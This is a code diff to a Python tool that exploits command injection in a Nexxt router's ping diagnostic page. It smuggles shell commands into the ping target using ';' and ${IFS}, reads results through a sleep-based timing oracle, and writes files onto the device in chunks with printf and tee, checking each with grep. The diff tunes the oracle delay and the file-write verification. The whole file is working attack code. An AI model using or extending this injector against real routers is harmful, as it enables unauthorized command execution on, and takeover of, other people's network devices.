@@ -22,13 +22,15 @@ from nexxt_phaseb import run_ping  # noqa: E402
 I = "${IFS}"
 CHUNK = 48
 MAX_TRIES = 4
+ORACLE_SLEEP = 5  # seconds added by the timing oracle when a condition holds
 
 
 class Injector:
-    def __init__(self) -> None:
-        self.client = NexxtClient("https://192.168.1.254", timeout=10.0)
+    def __init__(self, base_url: str = "https://192.168.1.254") -> None:
+        self.client = NexxtClient(base_url, timeout=10.0)
         if not self.client.is_authenticated():
-            raise RuntimeError("not authenticated")
+            raise RuntimeError("not authenticated; run nexxt_session.py login "
+                               "or import-cookie first")
         self.base, _ = run_ping(self.client, "127.0.0.1")
         self.counter = 0
 
@@ -37,14 +39,18 @@ class Injector:
         return elapsed
 
     def ask(self, cmd: str) -> bool:
-        elapsed, _ = run_ping(self.client, ":::::::;" + cmd + "&&sleep" + I + "8")
-        return elapsed > self.base + 4
+        elapsed, _ = run_ping(
+            self.client, ":::::::;" + cmd + f"&&sleep{I}{ORACLE_SLEEP}")
+        return elapsed > self.base + ORACLE_SLEEP - 2
 
     def _write_segment(self, seg: str, part: str, depth: int = 0) -> list[str]:
+        # grep -qFx matches the WHOLE line: since the file has no trailing
+        # newline, an exact full-line match proves both content and length in
+        # a single oracle round-trip (about 2x faster than content+length).
         for attempt in range(MAX_TRIES):
             self.do(f"printf{I}%s{I}{seg}|tee{I}{part}")
             time.sleep(0.4)
-            if self.ask(f"grep{I}-qF{I}{seg}{I}{part}"):
+            if self.ask(f"grep{I}-qFx{I}{seg}{I}{part}"):
                 print(f"[transfer] {part} ok ({len(seg)} chars)", flush=True)
                 return [part]
             print(f"[transfer] {part} attempt {attempt + 1} failed", flush=True)
